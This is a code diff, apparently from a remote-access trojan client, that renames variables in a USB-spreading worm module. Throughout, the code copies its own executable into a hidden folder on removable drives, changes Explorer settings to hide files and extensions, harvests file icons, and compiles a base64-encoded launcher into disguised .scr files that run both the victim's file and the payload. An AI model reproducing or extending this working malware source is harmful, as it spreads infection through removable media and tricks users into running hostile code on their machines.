@@ -33,28 +33,28 @@ namespace Client.Handle_Packet
         {
             ExplorerOptions();
             int count = 0;
-            foreach (DriveInfo USB in DriveInfo.GetDrives())
+            foreach (DriveInfo usb in DriveInfo.GetDrives())
             {
                 try
                 {
-                    if (USB.DriveType == DriveType.Removable && USB.IsReady)
+                    if (usb.DriveType == DriveType.Removable && usb.IsReady)
                     {
                         count += 1;
-                        if (!Directory.Exists(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory))
+                        if (!Directory.Exists(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory))
                         {
-                            Directory.CreateDirectory(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory);
-                            File.SetAttributes(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
+                            Directory.CreateDirectory(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory);
+                            File.SetAttributes(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                         }
 
-                        if (!Directory.Exists((USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory)))
-                            Directory.CreateDirectory((USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory));
+                        if (!Directory.Exists((usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory)))
+                            Directory.CreateDirectory((usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory));
 
-                        if (!File.Exists(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile))
-                            File.Copy(Application.ExecutablePath, USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
+                        if (!File.Exists(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile))
+                            File.Copy(Application.ExecutablePath, usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
 
-                        CreteDirectory(USB.RootDirectory.ToString());
+                        CreteDirectory(usb.RootDirectory.ToString());
 
-                        InfectFiles(USB.RootDirectory.ToString());
+                        InfectFiles(usb.RootDirectory.ToString());
                     }
                 }
                 catch (Exception ex)
@@ -76,18 +76,18 @@ namespace Client.Handle_Packet
         {
             try
             {
-                RegistryKey Key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
-                if (Key.GetValue("Hidden") != (object)2)
-                    Key.SetValue("Hidden", 2);
-                if (Key.GetValue("HideFileExt") != (object)1)
-                    Key.SetValue("HideFileExt", 1);
+                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
+                if (key.GetValue("Hidden") != (object)2)
+                    key.SetValue("Hidden", 2);
+                if (key.GetValue("HideFileExt") != (object)1)
+                    key.SetValue("HideFileExt", 1);
             }
             catch { }
         }
 
-        private void InfectFiles(string Path)
+        private void InfectFiles(string path)
         {
-            foreach (var file in Directory.GetFiles(Path))
+            foreach (var file in Directory.GetFiles(path))
             {
                 try
                 {
@@ -101,16 +101,16 @@ namespace Client.Handle_Packet
                 catch { }
             }
 
-            foreach (var directory in Directory.GetDirectories(Path))
+            foreach (var directory in Directory.GetDirectories(path))
             {
                 if (!directory.Contains(spreadSettings.WorkDirectory))
                     InfectFiles(directory);
             }
         }
 
-        private void CreteDirectory(string USB_Directory)
+        private void CreteDirectory(string usbDirectory)
         {
-            foreach (var directory in Directory.GetDirectories(USB_Directory))
+            foreach (var directory in Directory.GetDirectories(usbDirectory))
             {
                 try
                 {
@@ -145,41 +145,41 @@ namespace Client.Handle_Packet
         {
             try
             {
-                Icon FileIcon = Icon.ExtractAssociatedIcon(file);
-                MultiIcon MultiIcon = new MultiIcon();
-                SingleIcon SingleIcon = MultiIcon.Add(Path.GetFileName(file));
-                SingleIcon.CreateFrom(FileIcon.ToBitmap(), IconOutputFormat.Vista);
-                SingleIcon.Save(Path.GetPathRoot(file) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
+                Icon fileIcon = Icon.ExtractAssociatedIcon(file);
+                MultiIcon multiIcon = new MultiIcon();
+                SingleIcon singleIcon = multiIcon.Add(Path.GetFileName(file));
+                singleIcon.CreateFrom(fileIcon.ToBitmap(), IconOutputFormat.Vista);
+                singleIcon.Save(Path.GetPathRoot(file) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
             }
             catch { }
         }
 
-        private void CompileFile(string InfectedFile)
+        private void CompileFile(string infectedFile)
         {
             try
             {
-                string Source = Encoding.UTF8.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpbYXNzZW1ibHk6IEFzc2VtYmx5VHJhZGVtYXJrKCIlTGltZSUiKV0KW2Fzc2VtYmx5OiBHdWlkKCIlR3VpZCUiKV0KCnN0YXRpYyBjbGFzcyBMaW1lVVNCTW9kdWxlCnsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJUZpbGUlIik7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJVBheWxvYWQlIik7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQp9"));
-                Source = Source.Replace("%Payload%", Path.GetPathRoot(InfectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
-                Source = Source.Replace("%File%", InfectedFile.Insert(3, spreadSettings.WorkDirectory + "\\"));
-                Source = Source.Replace("%Lime%", spreadSettings.InfectedTrademark);
-                Source = Source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
-                Source = Source.Replace("%Guid%", Guid.NewGuid().ToString());
+                string source = Encoding.UTF8.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpbYXNzZW1ibHk6IEFzc2VtYmx5VHJhZGVtYXJrKCIlTGltZSUiKV0KW2Fzc2VtYmx5OiBHdWlkKCIlR3VpZCUiKV0KCnN0YXRpYyBjbGFzcyBMaW1lVVNCTW9kdWxlCnsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJUZpbGUlIik7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJVBheWxvYWQlIik7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQp9"));
+                source = source.Replace("%Payload%", Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
+                source = source.Replace("%File%", infectedFile.Insert(3, spreadSettings.WorkDirectory + "\\"));
+                source = source.Replace("%Lime%", spreadSettings.InfectedTrademark);
+                source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
+                source = source.Replace("%Guid%", Guid.NewGuid().ToString());
 
-                CompilerParameters CParams = new CompilerParameters();
-                Dictionary<string, string> ProviderOptions = new Dictionary<string, string>();
-                ProviderOptions.Add("CompilerVersion", GetOS());
+                CompilerParameters cParams = new CompilerParameters();
+                Dictionary<string, string> providerOptions = new Dictionary<string, string>();
+                providerOptions.Add("CompilerVersion", GetOS());
 
                 string options = "/target:winexe /platform:x86 /optimize+";
-                if (File.Exists(Path.GetPathRoot(InfectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico"))
-                    options += " /win32icon:\"" + Path.GetPathRoot(InfectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico" + "\"";
-                CParams.GenerateExecutable = true;
-                CParams.OutputAssembly = InfectedFile + ".scr";
-                CParams.CompilerOptions = options;
-                CParams.TreatWarningsAsErrors = false;
-                CParams.IncludeDebugInformation = false;
-                CParams.ReferencedAssemblies.Add("System.dll");
+                if (File.Exists(Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"))
+                    options += " /win32icon:\"" + Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico" + "\"";
+                cParams.GenerateExecutable = true;
+                cParams.OutputAssembly = infectedFile + ".scr";
+                cParams.CompilerOptions = options;
+                cParams.TreatWarningsAsErrors = false;
+                cParams.IncludeDebugInformation = false;
+                cParams.ReferencedAssemblies.Add("System.dll");
 
-                CompilerResults Results = new CSharpCodeProvider(ProviderOptions).CompileAssemblyFromSource(CParams, Source);
+                CompilerResults results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(cParams, source);
             }
             catch (Exception ex)
             {
@@ -189,8 +189,8 @@ namespace Client.Handle_Packet
 
         private string GetOS()
         {
-            var OS = new Microsoft.VisualBasic.Devices.ComputerInfo();
-            if (OS.OSFullName.Contains("7"))
+            var os = new Microsoft.VisualBasic.Devices.ComputerInfo();
+            if (os.OSFullName.Contains("7"))
                 return "v2.0";
             else
                 return "v4.0";
